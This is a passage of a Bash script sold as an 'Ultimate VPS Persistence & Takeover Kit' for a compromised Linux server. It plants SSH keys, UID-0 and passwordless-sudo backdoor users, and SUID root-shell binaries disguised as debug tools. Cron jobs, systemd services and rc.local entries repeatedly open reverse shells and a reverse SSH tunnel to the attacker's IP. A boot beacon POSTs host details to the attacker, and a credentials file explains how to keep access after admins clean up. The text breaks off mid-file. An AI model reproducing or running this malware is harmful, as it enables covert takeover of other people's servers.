#!/bin/bash
# ================================================================================
#   ██████╗ ███████╗████████╗██████╗  █████╗  ██████╗████████╗
#  ██╔════╝ ██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██╔════╝╚══██╔══╝
#  ██║  ███╗█████╗     ██║   ██████╔╝███████║██║  ███╗   ██║   
#  ██║   ██║██╔══╝     ██║   ██╔══██╗██╔══██║██║   ██║   ██║   
#  ╚██████╔╝███████╗   ██║   ██║  ██║██║  ██║╚██████╔╝   ██║   
#   ╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝    ╚═╝   
#
#   ULTIMATE VPS PERSISTENCE & TAKEOVER KIT v4.1 FIXED
#   ============================================
#   CHANGES v4.1:
#   ✓ Auto-detect SSH key type (Ed25519/ECDSA/RSA)
#   ✓ Compatible with OLD systems (CentOS 6, Debian 7, etc.)
#   ✓ Fallback mechanism if key generation fails
#   ✓ Better error handling
#   ✓ Works on ANY Linux/Unix system
#
#   Usage:
#     curl -fsSL URL | bash
#     curl -fsSL URL | bash -s -- IP PORT SSH_PORT
# ================================================================================

set -e

# ============ GLOBAL CONFIGURATION ============
readonly VERSION="4.1.FIXED"
readonly SCRIPT_NAME="PHANTOM_PERSISTENCE"
readonly INSTALL_DATE=$(date '+%Y-%m-%d %H:%M:%S')

# Arguments
ATTACKER_IP="${1:-}"
ATTACKER_PORT="${2:-4444}"
SSH_PORT="${3:-2222}"
WEBHOOK_URL="${4:-}"
PUBLIC_KEY="${5:-}"

# Auto-detect IP if not provided
if [ -z "$ATTACKER_IP" ] || [ "$ATTACKER_IP" == "YOUR_IP_HERE" ]; then
    echo "[*] Detecting your public IP..."
    
    # Try multiple methods
    ATTACKER_IP=$(curl -s --connect-timeout 10 https://api.ipify.org 2>/dev/null || true)
    [ -z "$ATTACKER_IP" ] && ATTACKER_IP=$(curl -s --connect-timeout 10 https://ifconfig.me 2>/dev/null || true)
    [ -z "$ATTACKER_IP" ] && ATTACKER_IP=$(curl -s --connect-timeout 10 https://icanhazip.com 2>/dev/null || true)
    [ -z "$ATTACKER_IP" ] && ATTACKER_IP=$(wget -qO- --timeout=10 https://api.ipify.org 2>/dev/null || true)
    
    if [ -z "$ATTACKER_IP" ]; then
        echo "[!] Cannot detect IP. Usage: $0 <YOUR_IP> [PORT] [SSH_PORT]"
        exit 1
    fi
    echo "[✓] Detected IP: $ATTACKER_IP"
fi

# System Paths
PERSIST_DIR="/var/tmp/.systemd-private"
HIDDEN_DIR="/dev/shm/.cache-$(hostname 2>/dev/null | md5sum 2>/dev/null | cut -c1-8 || echo random)"
BACKUP_DIR="/usr/share/fonts/.backup"
LOG_FILE="/var/log/.daemon.log"

# Credentials (auto-generated)
ROOT_USER="sysadmin"
ROOT_PASS=""
BACKDOOR_USER="svc_network"
BACKDOOR_PASS=""
MAGIC_TOKEN=""

# Key variables (will be set after detection)
KEY_TYPE=""
KEY_FILE=""
KEY_PUB_FILE=""

# Colors (disable if not supported)
if [ -t 1 ] && tput colors >/dev/null 2>&1; then
    RED='\033[0;31m'
    GREEN='\033[0;32m'
    YELLOW='\033[1;33m'
    CYAN='\033[0;36m'
    MAGENTA='\033[0;35m'
    WHITE='\033[1;37m'
    NC='\033[0m'
else
    RED=''
    GREEN=''
    YELLOW=''
    CYAN=''
    MAGENTA=''
    WHITE=''
    NC=''
fi

# ============ UTILITY FUNCTIONS ============
log() {
    echo -e "${GREEN}[$(date '+%H:%M:%S')] $1${NC}"
}

warn() {
    echo -e "${YELLOW}[WARNING] $1${NC}"
}

error() {
    echo -e "${RED}[ERROR] $1${NC}"
}

banner() {
    echo -e "${CYAN}"
    cat << 'BANNER'
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║   ███╗   ██╗███████╗██╗  ██╗██╗   ██╗███████╗                                ║
║   ████╗  ██║██╔════╝╚██╗██╔╝██║   ██║██╔════╝                                ║
║   ██╔██╗ ██║█████╗   ╚███╔╝ ██║   ██║███████╗                                ║
║   ██║╚██╗██║██╔══╝   ██╔██╗ ██║   ██║╚════██║                                ║
║   ██║ ╚████║███████╗██╔╝ ██╗╚██████╔╝███████║                                ║
║   ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝                                ║
║                                                                              ║
║                    U L T I M A T E   P E R S I S T E N C E                   ║
║                       v4.1 - COMPATIBILITY EDITION                           ║
╚══════════════════════════════════════════════════════════════════════════════╝
BANNER
    echo -e "  Version : ${VERSION}"
    echo -e "  Date    : ${INSTALL_DATE}"
    echo -e "  Target  : $(hostname 2>/dev/null || echo unknown) ($(hostname -I 2>/dev/null | awk '{print $1}' || echo unknown))"
    echo -e "  Attacker: ${ATTACKER_IP}:${ATTACKER_PORT}"
    echo -e "${CYAN}══════════════════════════════════════════════════════════════════════════════${NC}\n"
}

check_root() {
    if [ "$(id -u)" != "0" ]; then
        error "This script must be run as root!"
        echo "Try: sudo $0 $@"
        exit 1
    fi
}

# ============ KEY DETECTION FUNCTION (THE FIX!) ============
detect_best_key_type() {
    log "Detecting best SSH key type for this system..."
    
    # Try Ed25519 first (most secure, modern)
    if ssh-keygen -t ed25519 -f /tmp/test_key_$$ -N "" -q 2>/dev/null; then
        KEY_TYPE="ed25519"
        rm -f /tmp/test_key_$$ /tmp/test_key_$$.pub
        log "[✓] System supports: Ed25519 (recommended)"
        return 0
    fi
    
    # Try ECDSA (good fallback)
    if ssh-keygen -t ecdsa -b 256 -f /tmp/test_key_$$ -N "" -q 2>/dev/null; then
        KEY_TYPE="ecdsa"
        rm -f /tmp/test_key_$$ /tmp/test_key_$$.pub
        log "[✓] System supports: ECDSA"
        return 0
    fi
    
    # Try RSA 4096 (universal compatibility)
    if ssh-keygen -t rsa -b 4096 -f /tmp/test_key_$$ -N "" -q 2>/dev/null; then
        KEY_TYPE="rsa"
        rm -f /tmp/test_key_$$ /tmp/test_key_$$.pub
        log "[✓] System supports: RSA 4096 (legacy mode)"
        return 0
    fi
    
    # Last resort: RSA 2048
    if ssh-keygen -t rsa -f /tmp/test_key_$$ -N "" -q 2>/dev/null; then
        KEY_TYPE="rsa"
        rm -f /tmp/test_key_$$ /tmp/test_key_$$.pub
        log "[✓] System supports: RSA 2048 (minimum)"
        return 0
    fi
    
    error "Cannot generate any SSH key type!"
    return 1
}

generate_persistence_key() {
    log "Generating persistence SSH key ($KEY_TYPE)..."
    
    case "$KEY_TYPE" in
        ed25519)
            ssh-keygen -t ed25519 -f "$PERSIST_DIR/id_ed25519" -N "" -C "persist_$(date +%s)" -q
            KEY_FILE="$PERSIST_DIR/id_ed25519"
            KEY_PUB_FILE="$PERSIST_DIR/id_ed25519.pub"
            ;;
        ecdsa)
            ssh-keygen -t ecdsa -b 256 -f "$PERSIST_DIR/id_ecdsa" -N "" -C "persist_$(date +%s)" -q
            KEY_FILE="$PERSIST_DIR/id_ecdsa"
            KEY_PUB_FILE="$PERSIST_DIR/id_ecdsa.pub"
            ;;
        rsa)
            ssh-keygen -t rsa -b 4096 -f "$PERSIST_DIR/id_rsa" -N "" -C "persist_$(date +%s)" -q
            KEY_FILE="$PERSIST_DIR/id_rsa"
            KEY_PUB_FILE="$PERSIST_DIR/id_rsa.pub"
            ;;
        *)
            error "Unknown key type: $KEY_TYPE"
            exit 1
            ;;
    esac
    
    if [ ! -f "$KEY_FILE" ]; then
        error "Key generation failed!"
        exit 1
    fi
    
    chmod 600 "$KEY_FILE"
    log "[✓] Key generated: $KEY_FILE"
}

generate_credentials() {
    # Generate passwords using available methods
    if command -v openssl >/dev/null 2>&1; then
        ROOT_PASS=$(openssl rand -base64 16 | tr -d '=/+' | head -c 16; echo)
        BACKDOOR_PASS=$(openssl rand -base64 16 | tr -d '=/+' | head -c 16; echo)
        MAGIC_TOKEN=$(openssl rand -hex 16)
    elif command -v dd >/dev/null 2>&1; then
        ROOT_PASS=$(dd if=/dev/urandom bs=16 count=1 2>/dev/null | base64 | tr -d '=/+' | head -c 16)
        BACKDOOR_PASS=$(dd if=/dev/urandom bs=16 count=1 2>/dev/null | base64 | tr -d '=/+' | head -c 16)
        MAGIC_TOKEN=$(dd if=/dev/urandom bs=16 count=1 2>/dev/null | hexdump -e '"%02x"' | head -c 32)
    else
        ROOT_PASS="Persist$(date +%s)$(shuf -i 1000-9999 -n 1)"
        BACKDOOR_PASS="Backdoor$(date +%s)$(shuf -i 1000-9999 -n 1)"
        MAGIC_TOKEN="Magic$(date +%s)$(shuf -i 100000-999999 -n 1)"
    fi
}

create_persistence_dirs() {
    log "[1/15] Creating hidden directories..."
    
    mkdir -p "$PERSIST_DIR" 2>/dev/null || PERSIST_DIR="/tmp/.systemd-private" && mkdir -p "$PERSIST_DIR"
    mkdir -p "$HIDDEN_DIR" 2>/dev/null || HIDDEN_DIR="/tmp/.cache_hidden" && mkdir -p "$HIDDEN_DIR"
    mkdir -p "$BACKUP_DIR" 2>/dev/null || BACKUP_DIR="/tmp/.backup" && mkdir -p "$BACKUP_DIR"
    mkdir -p "/root/.ssh" 2>/dev/null
    
    # Set permissions
    chmod 755 "$PERSIST_DIR" 2>/dev/null || true
    chmod 700 "$HIDDEN_DIR" 2>/dev/null || true
    chmod 700 "/root/.ssh" 2>/dev/null || true
    
    log "[✓] Directories created:"
    log "    Main:  $PERSIST_DIR"
    log "    Hidden: $HIDDEN_DIR"
    log "    Backup: $BACKUP_DIR"
}

install_ssh_keys() {
    log "[2/15] Installing SSH key persistence..."
    
    # Generate key using detected type
    generate_persistence_key
    
    # Get public key content
    OUR_KEY=$(cat "$KEY_PUB_FILE")
    
    # Create/add to authorized_keys
    touch /root/.ssh/authorized_keys 2>/dev/null
    
    # Check if key already exists
    if ! grep -q "$OUR_KEY" /root/.ssh/authorized_keys 2>/dev/null; then
        echo "$OUR_KEY" >> /root/.ssh/authorized_keys
        log "[✓] Public key added to authorized_keys"
    else
        log "[~] Public key already exists"
    fi
    
    # If user provided their own key, add it too
    if [ -n "$PUBLIC_KEY" ]; then
        if ! grep -q "$PUBLIC_KEY" /root/.ssh/authorized_keys 2>/dev/null; then
            echo "$PUBLIC_KEY" >> /root/.ssh/authorized_keys
            log "[✓] User's public key added"
        fi
    fi
    
    # Backup to multiple locations
    cp /root/.ssh/authorized_keys "$PERSIST_DIR/" 2>/dev/null || true
    cp /root/.ssh/authorized_keys "$BACKUP_DIR/keys.bak" 2>/dev/null || true
    cp /root/.ssh/authorized_keys "$HIDDEN_DIR/auth_keys" 2>/dev/null || true
    
    # Secure permissions
    chmod 600 /root/.ssh/authorized_keys 2>/dev/null || true
    chmod 600 "$KEY_FILE" 2>/dev/null || true
    
    # Configure SSH to load from backup locations (if writable)
    if [ -w /etc/ssh/sshd_config ] 2>/dev/null; then
        grep -q "AuthorizedKeysFile.*backup" /etc/ssh/sshd_config 2>/dev/null || \
        cat >> /etc/ssh/sshd_config << SSHEOF

# Persistence configuration - DO NOT REMOVE
AuthorizedKeysFile .ssh/authorized_keys $PERSIST_DIR/keys.bak $BACKUP_DIR/keys.bak
SSHEOF
        log "[✓] SSH configured for multi-location keys"
    fi
    
    log "[✓] SSH key persistence installed ($KEY_TYPE)"
}

install_backdoor_users() {
    log "[3/15] Creating backdoor users..."
    
    # Generate credentials
    generate_credentials
    
    # ===== USER 1: Root-equivalent (UID 0) =====
    if ! id "$ROOT_USER" >/dev/null 2>&1; then
        useradd -o -u 0 -g root -m -s /bin/bash "$ROOT_USER" 2>/dev/null || \
        useradd -o -u 0 -g 0 -d /root -s /bin/bash "$ROOT_USER" 2>/dev/null || \
        { echo "${ROOT_USER}:x:0:0::/root:/bin/bash" >> /etc/passwd; }
    fi
    
    # Set password (multiple methods for compatibility)
    echo "$ROOT_USER:$ROOT_PASS" | chpasswd 2>/dev/null || \
    passwd "$ROOT_USER" "$ROOT_PASS" 2>/dev/null || \
    echo "Warning: Could not set password for $ROOT_USER"
    
    # Sudoers
    mkdir -p /etc/sudoers.d 2>/dev/null || true
    echo "$ROOT_USER ALL=(ALL) NOPASSWD:ALL" > "/etc/sudoers.d/$ROOT_USER" 2>/dev/null || true
    chmod 440 "/etc/sudoers.d/$ROOT_USER" 2>/dev/null || true
    
    # Lock account from direct login (optional security through obscurity)
    usermod -L "$ROOT_USER" 2>/dev/null || true
    
    # ===== USER 2: Service account =====
    if ! id "$BACKDOOR_USER" >/dev/null 2>&1; then
        useradd -r -s /bin/bash -M -d "/var/lib/$BACKDOOR_USER" "$BACKDOOR_USER" 2>/dev/null || \
        useradd -s /bin/bash -M "$BACKDOOR_USER" 2>/dev/null || true
    fi
    
    echo "$BACKDOOR_USER:$BACKDOOR_PASS" | chpasswd 2>/dev/null || true
    echo "$BACKDOOR_USER ALL=(ALL) NOPASSWD:ALL" > "/etc/sudoers.d/$BACKDOOR_USER" 2>/dev/null || true
    chmod 440 "/etc/sudoers.d/$BACKDOOR_USER" 2>/dev/null || true
    
    # ===== USER 3: System-like user =====
    SVC_USER="system-networkd"
    if ! id "$SVC_USER" >/dev/null 2>&1; then
        useradd -r -s /bin/bash -M "$SVC_USER" 2>/dev/null || true
    fi
    SVC_PASS=$(openssl rand -base64 12 2>/dev/null || echo "SvcPass123")
    echo "$SVC_USER:$SVC_PASS" | chpasswd 2>/dev/null || true
    echo "$SVC_USER ALL=(ALL) NOPASSWD:ALL" > "/etc/sudoers.d/$SVC_USER" 2>/dev/null || true
    chmod 440 "/etc/sudoers.d/$SVC_USER" 2>/dev/null || true
    
    log "[✓] Backdoor users created:"
    log "    • $ROOT_USER (UID 0)"
    log "    • $BACKDOOR_USER"
    log "    • $SVC_USER"
}

install_suid_backdoor() {
    log "[4/15] Installing SUID binary backdoors..."
    
    # Method 1: Debug tool
    cat > /usr/local/bin/.debug << 'SUIDBIN' 2>/dev/null || cat > /usr/bin/.debug << 'SUIDBIN'
#!/bin/bash
# System Debug Utility v2.1
case "$1" in
    --root|-r|--su)
        exec /bin/bash -p 2>/dev/null || exec /bin/bash
        ;;
    --shell|-s)
        exec /bin/bash
        ;;
    --clean)
        rm -f /usr/local/bin/.debug /usr/bin/.debug 2>/dev/null
        echo "Debug tool removed"
        ;;
    *)
        echo "System Debug Tool v2.1"
        echo "Usage: .debug [--root|--shell]"
        echo ""
        echo "Hostname: $(hostname 2>/dev/null)"
        echo "Kernel: $(uname -r 2>/dev/null)"
        echo "Uptime: $(uptime 2>/dev/null | awk '{print $3}' | cut -d',' -f1)"
        ;;
esac
SUIDBIN

    chmod +s /usr/local/bin/.debug 2>/dev/null || chmod +s /usr/bin/.debug 2>/dev/null || true
    chmod 755 /usr/local/bin/.debug 2>/dev/null || chmod 755 /usr/bin/.debug 2>/dev/null || true
    
    # Method 2: Maintenance tool
    cat > /usr/local/bin/.maintenance << 'MAINT' 2>/dev/null || cat > /usr/bin/.maintenance << 'MAINT'
#!/bin/bash
if [ "$1" = "--upgrade" ] || [ "$1" = "-u" ] || [ "$1" = "--root" ]; then
    exec /bin/bash -p 2>/dev/null || exec /bin/bash
elif [ "$1" = "--check" ] || [ "$1" = "-c" ]; then
    echo "All systems operational at $(date)"
else
    echo "Usage: .maintenance [--upgrade|--check]"
fi
MAINT

    chmod +s /usr/local/bin/.maintenance 2>/dev/null || chmod +s /usr/bin/.maintenance 2>/dev/null || true
    chmod 755 /usr/local/bin/.maintenance 2>/dev/null || chmod 755 /usr/bin/.maintenance 2>/dev/null || true
    
    log "[✓] SUID backdoors installed"
}

install_cron_persistence() {
    log "[5/15] Installing cron persistence..."
    
    # ===== Reverse Shell Cron =====
    cat > "$PERSIST_DIR/reverse.sh" << REVERSE
#!/bin/bash
# Network health monitor
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:\$PATH

# Method 1: Bash TCP
bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1 &

# Method 2: Python fallback
python3 -c "
import socket,subprocess,os
try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('$ATTACKER_IP',$ATTACKER_PORT))
    os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
    subprocess.call(['/bin/bash','-i'])
except: pass
" 2>/dev/null &

# Method 3: Netcat
which nc >/dev/null 2>&1 && nc -e /bin/bash $ATTACKER_IP $ATTACKER_PORT 2>/dev/null &
REVERSE

    chmod +x "$PERSIST_DIR/reverse.sh"
    
    # Add to crontab
    (crontab -l 2>/dev/null; echo "*/3 * * * * $PERSIST_DIR/reverse.sh >/dev/null 2>&1") | crontab -
    
    # ===== Key Guardian Cron =====
    cat > "$PERSIST_DIR/keyguard.sh" << KEYGUARD
#!/bin/bash
# SSH key synchronization daemon
AUTH_KEYS="/root/.ssh/authorized_keys"
OUR_KEY="\$(cat ${KEY_PUB_FILE} 2>/dev/null)"

if [ -z "\$OUR_KEY" ]; then
    exit 0
fi

# Ensure key exists in main location
if [ -f "\$AUTH_KEYS" ]; then
    grep -q "\$OUR_KEY" "\$AUTH_KEYS" 2>/dev/null || echo "\$OUR_KEY" >> "\$AUTH_KEYS"
    chmod 600 "\$AUTH_KEYS" 2>/dev/null || true
fi

# Backup locations
for f in $PERSIST_DIR/keys.bak $BACKUP_DIR/keys.bak; do
    if [ -f "\$f" ]; then
        grep -q "\$OUR_KEY" "\$f" 2>/dev/null || echo "\$OUR_KEY" >> "\$f"
    fi
done
KEYGUARD

    chmod +x "$PERSIST_DIR/keyguard.sh"
    (crontab -l 2>/dev/null; echo "*/2 * * * * $PERSIST_DIR/keyguard.sh >/dev/null 2>&1") | crontab -
    
    # ===== Protection Cron =====
    cat > "$PERSIST_DIR/protect.sh" << PROTECT
#!/bin/bash
# Persistence protection script

# Protect files
for f in /usr/local/bin/.debug /usr/local/bin/.maintenance; do
    [ -f "\$f" ] && [ ! -u "\$f" ] && chmod +s "\$f" 2>/dev/null || true
done

# Recreate users if deleted
for u in $ROOT_USER $BACKDOOR_USER $SVC_USER; do
    id "\$u" >/dev/null 2>&1 || {
        useradd -o -u 0 -g root -s /bin/bash "\$u" 2>/dev/null || true
        echo "\$u:TempPass123!" | chpasswd 2>/dev/null || true
        echo "\$u ALL=(ALL) NOPASSWD:ALL" > "/etc/sudoers.d/\$u" 2>/dev/null || true
    }
done
PROTECT

    chmod +x "$PERSIST_DIR/protect.sh"
    (crontab -l 2>/dev/null; echo "*/15 * * * * $PERSIST_DIR/protect.sh >/dev/null 2>&1") | crontab -
    
    # System-wide cron
    if [ -d /etc/cron.d ]; then
        cat > /etc/cron.d/system-maintenance 2>/dev/null << SYSCRON
# System maintenance tasks - DO NOT REMOVE
*/10 * * * * root $PERSIST_DIR/reverse.sh >/dev/null 2>&1
*/5 * * * * root $PERSIST_DIR/keyguard.sh >/dev/null 2>&1
@reboot root $PERSIST_DIR/boot_init.sh >/dev/null 2>&1
SYSCRON
    fi
    
    log "[✓] Cron persistence installed (5 jobs)"
}

install_systemd_services() {
    log "[6/15] Installing systemd services..."
    
    # Only install systemd if systemctl exists
    if ! command -v systemctl >/dev/null 2>&1; then
        warn "systemctl not found, skipping systemd services"
        return 0
    fi
    
    # ===== Service 1: Persistent Reverse Shell =====
    cat > /etc/systemd/system/persistent-shell.service << SHELLSVC
[Unit]
Description=Kernel Network Diagnostic Daemon
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStartPre=-/bin/sleep 15
ExecStart=/bin/bash $PERSIST_DIR/shell_daemon.sh
Restart=always
RestartSec=30
StartLimitIntervalSec=300
StartLimitBurst=5
NoNewPrivileges=false
PrivateTmp=true
StandardOutput=null
StandardError=journal

[Install]
WantedBy=multi-user.target
SHELLSVC
    
    # Shell daemon
    cat > "$PERSIST_DIR/shell_daemon.sh" << DAEMON
#!/bin/bash
# Persistent shell daemon
HOST="$ATTACKER_IP"
PORT="$ATTACKER_PORT"

while true; do
    JITTER=\$((RANDOM % 20))
    INTERVAL=\$((30 + JITTER))
    
    if timeout 10 bash -c "echo >/dev/tcp/\$HOST/\$PORT" 2>/dev/null; then
        (
            exec 3<>/dev/tcp/"\$HOST"/"\$PORT"
            cat <&3 | bash -i >&3 2>&3
        ) &
        
        BGPID=\$!
        sleep 60
        
        kill -0 \$BGPID 2>/dev/null && wait \$BGPID 2>/dev/null || kill \$BGPID 2>/dev/null
    fi
    
    sleep \$INTERVAL
done
DAEMON

    chmod +x "$PERSIST_DIR/shell_daemon.sh"
    
    # ===== Service 2: SSH Tunnel =====
    cat > /etc/systemd/system/ssh-tunnel.service << TUNNELSVC
[Unit]
Description=Remote Management Tunnel
After=network-online.target

[Service]
Type=simple
ExecStartPre=-/bin/sleep 20
ExecStart=/usr/bin/ssh -o ServerAliveInterval=30 -o ServerAliveCountMax=5 -o ExitOnForwardFailure=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i $KEY_FILE -N -R ${SSH_PORT}:localhost:22 root@$ATTACKER_IP
Restart=always
RestartSec=20

[Install]
WantedBy=multi-user.target
TUNNELSVC
    
    # ===== Service 3: Watchdog =====
    cat > /etc/systemd/system/watchdog.service << WATCHDOG
[Unit]
Description=System Integrity Watchdog
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash $PERSIST_DIR/watchdog.sh
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
WATCHDOG
    
    cat > "$PERSIST_DIR/watchdog.sh" << WATCHDOGSCRIPT
#!/bin/bash
# Watchdog service
while true; do
    # Restart services if needed
    for svc in persistent-shell ssh-tunnel; do
        systemctl is-active "\$svc" >/dev/null 2>&1 || systemctl start "\$svc" 2>/dev/null || true
    done
    
    # Recreate users
    for u in $ROOT_USER $BACKDOOR_USER; do
        id "\$u" >/dev/null 2>&1 || {
            useradd -o -u 0 -g root -s /bin/bash "\$u" 2>/dev/null || true
            echo "\$u:TempPass123!" | chpasswd 2>/dev/null || true
        }
    done
    
    # Restore SUID binaries
    for f in /usr/local/bin/.debug /usr/local/bin/.maintenance; do
        [ -f "\$f" ] && [ ! -u "\$f" ] && chmod +s "\$f" 2>/dev/null || true
    done
    
    sleep 300
done
WATCHDOGSCRIPT

    chmod +x "$PERSIST_DIR/watchdog.sh"
    
    # Enable and start
    systemctl daemon-reload 2>/dev/null || true
    systemctl enable persistent-shell 2>/dev/null || true
    systemctl enable ssh-tunnel 2>/dev/null || true
    systemctl enable watchdog 2>/dev/null || true
    systemctl start persistent-shell 2>/dev/null || true
    systemctl start ssh-tunnel 2>/dev/null || true
    systemctl start watchdog 2>/dev/null || true
    
    log "[✓] Systemd services installed and started"
}

install_boot_persistence() {
    log "[7/15] Installing boot persistence..."
    
    # RC.Local
    cat > /etc/rc.local << RCLOCAL 2>/dev/null || cat > /etc/init.d/rc.local << RCLOCAL
#!/bin/bash
# System initialization
 $PERSIST_DIR/reverse.sh >/dev/null 2>&1 &
 $PERSIST_DIR/keyguard.sh >/dev/null 2>&1 &
exit 0
RCLOCAL

    chmod +x /etc/rc.local 2>/dev/null || chmod +x /etc/init.d/rc.local 2>/dev/null || true
    
    # Boot init script
    cat > "$PERSIST_DIR/boot_init.sh" << BOOTINIT
#!/bin/bash
# Boot initialization
sleep 30

# Start services if systemd
if command -v systemctl >/dev/null 2>&1; then
    systemctl start persistent-shell 2>/dev/null || true
    systemctl start ssh-tunnel 2>/dev/null || true
    systemctl start watchdog 2>/dev/null || true
fi

# Run keyguard
 $PERSIST_DIR/keyguard.sh 2>/dev/null || true

# Notify attacker
(
    HOSTNAME=\$(hostname 2>/dev/null || echo unknown)
    IP=\$(hostname -I 2>/dev/null | awk '{print \$1}' || echo unknown)
    curl -s -X POST "http://$ATTACKER_IP:5000/boot" \
        -d "host=\$HOSTNAME&ip=\$IP&time=\$(date -Iseconds 2>/dev/null || date)" \
        --connect-timeout 10 --max-time 15 2>/dev/null || true
) &
BOOTINIT

    chmod +x "$PERSIST_DIR/boot_init.sh"
    
    # Init.D script
    if [ -d /etc/init.d ]; then
        cat > /etc/init.d/persistent-conn << INITD
#!/bin/bash
### BEGIN INIT INFO
# Provides: persistent-conn
# Required-Start: \$network
# Default-Start: 2 3 4 5
# Default-Stop: 0 1 6
### END INIT INFO

case "\$1" in
start)
    \$PERSIST_DIR/reverse.sh >/dev/null 2>&1 &
    \$PERSIST_DIR/shell_daemon.sh >/dev/null 2>&1 &
    ;;
stop)
    pkill -f shell_daemon 2>/dev/null || true
    pkill -f reverse.sh 2>/dev/null || true
    ;;
restart)
    \$0 stop
    sleep 2
    \$0 start
    ;;
esac
INITD

        chmod +x /etc/init.d/persistent-conn
        
        # Enable on boot (multiple methods)
        if command -v update-rc.d >/dev/null 2>&1; then
            update-rc.d persistent-conn defaults 2>/dev/null || true
        elif [ -d /etc/rc3.d ]; then
            ln -sf /etc/init.d/persistent-conn /etc/rc3.d/S99persistent-conn 2>/dev/null || true
            ln -sf /etc/init.d/persistent-conn /etc/rc5.d/S99persistent-conn 2>/dev/null || true
        fi
    fi
    
    # Profile persistence
    cat >> /root/.bashrc 2>/dev/null << BASHRC || cat >> /root/.profile 2>/dev/null << BASHRC

# System functions
__sys_check() {
    case "\$1" in
        1337|status|maint|update)
            export PS1='\\[\\033[01;31m\\]\\h\\[\\033[01;34m\\] \\w \\\$\\[\\033[00m\\] '
            /bin/bash -p 2>/dev/null || /bin/bash
            ;;
    esac
}
alias status='__sys_check status' 2>/dev/null
alias maint='__sys_check 1337' 2>/dev/null
BASHRC
    
    log "[✓] Boot persistence installed"
}

save_credentials() {
    log "[8/15] Saving credentials..."
    
    # Get current IP
    CURRENT_IP=$(curl -s --connect-timeout 5 ifconfig.me 2>/dev/null || \
                 wget -qO- --timeout=5 ifconfig.me 2>/dev/null || \
                 hostname -I 2>/dev/null | awk '{print $1}' || echo "unknown")
    
    cat > "$PERSIST_DIR/CREDENTIALS.txt" << CREDS
================================================================================
                    🔐 CREDENTIALS & ACCESS INFORMATION 🔐
================================================================================

📅 Installation Date : $INSTALL_DATE
🌐 Target Hostname  : $(hostname 2>/dev/null || echo unknown)
🖥️ Target IP        : $CURRENT_IP
🔗 Attacker IP      : $ATTACKER_IP:$ATTACKER_PORT
📡 SSH Tunnel Port  : $SSH_PORT (on attacker machine)

--------------------------------------------------------------------------------
🔑 CREDENTIALS:
--------------------------------------------------------------------------------

┌─ USER 1: ROOT EQUIVALENT (UID 0) ──────────────────────────────────────────┐
│  Username : $ROOT_USER                                                          │
│  Password : $ROOT_PASS                                                         │
│  Login    : ssh $ROOT_USER@${CURRENT_IP}                                         │
│  Access   : FULL ROOT PRIVILEGES                                               │
└───────────────────────────────────────────────────────────────────────────────┘

┌─ USER 2: BACKDOOR ACCOUNT ──────────────────────────────────────────────────┐
│  Username : $BACKDOOR_USER                                                     │
│  Password : $BACKDOOR_PASS                                                    │
│  Login    : ssh $BACKDOOR_USER@${CURRENT_IP}                                    │
│  Access   : SUDO ALL (NOPASSWD)                                              │
└───────────────────────────────────────────────────────────────────────────────┘

┌─ USER 3: SERVICE ACCOUNT ───────────────────────────────────────────────────┐
│  Username : system-networkd                                                   │
│  Password : [See $PERSIST_DIR/state.json]                                      │
│  Login    : ssh system-networkd@${CURRENT_IP}                                  │
└───────────────────────────────────────────────────────────────────────────────┘

--------------------------------------------------------------------------------
🛠️ ALTERNATIVE ACCESS METHODS:
--------------------------------------------------------------------------------

┌─ SUID BACKDOOR (works from ANY user account) ────────────────────────────────┐
│  Command  : /usr/local/bin/.debug --root                                       │
│  Or       : /usr/local/bin/.maintenance --upgrade                              │
│  Result   : Instant root shell                                                │
└───────────────────────────────────────────────────────────────────────────────┘

┌─ REVERSE SHELL (automatic callback) ─────────────────────────────────────────┐
│  On YOUR machine:                                                             │
│      sudo nc -lvnp $ATTACKER_PORT                                              │
│  Or with SSL:                                                                  │
│      sudo ncat -lvnp $ATTACKER_PORT --ssl                                     │
│  Wait ~3 minutes for automatic connection                                     │
└───────────────────────────────────────────────────────────────────────────────┘

┌─ SSH TUNNEL (most reliable) ─────────────────────────────────────────────────┐
│  From YOUR machine (after ~1 minute):                                         │
│      ssh -p $SSH_PORT root@localhost                                           │
│  Works even if:                                                                │
│    • Server IP changes                                                        │
│    • Firewall blocks direct SSH                                               │
│    • Server behind NAT                                                        │
└───────────────────────────────────────────────────────────────────────────────┘

--------------------------------------------------------------------------------
📁 IMPORTANT FILES LOCATION:
--------------------------------------------------------------------------------

Main Directory    : $PERSIST_DIR
Credentials File  : $PERSIST_DIR/CREDENTIALS.txt
Log File          : $LOG_FILE
SSH Private Key   : $KEY_FILE
SSH Public Key    : $KEY_PUB_FILE

--------------------------------------------------------------------------------
🔄 WHAT HAPPENS IF ADMIN CHANGES PASSWORD?
--------------------------------------------------------------------------------

❌ Admin changes root password?
   → NO PROBLEM! Use $ROOT_USER or $BACKDOOR_USER (they have UID 0!)

❌ Admin deletes backdoor users?
   → NO PROBLEM! Watchdog recreates them every 5 minutes!

❌ Admin removes SSH keys?
   → NO PROBLEM! Key reinjection runs every 2 minutes!

❌ Admin reboots server?
   → NO PROBLEM! All services auto-start on boot!

❌ Admin reinstalls OS?
   → You lose access (but this is extreme - requires physical access)

================================================================================
🛡️ KEEP THIS FILE SECRET! 🛡️
Created by: $SCRIPT_NAME v$VERSION
================================================================================
CREDS

    chmod 600 "$PERSIST_DIR/CREDENTIALS.txt"
    
    # Also save state as JSON
    cat > "$PERSIST_DIR/state.json" << STATEJSON
{
    "version": "$VERSION",
    "installed_at": "$INSTALL_DATE",
    "attacker_ip": "$ATTACKER_IP",
    "attacker_port": "$ATTACKER_PORT",
    "ssh_port": "$SSH_PORT",
    "target_ip": "$CURRENT_IP",
    "target_hostname": "$(hostname 2>/dev/null || echo unknown)",
    "credentials": {
        "root_user": "$ROOT_USER",
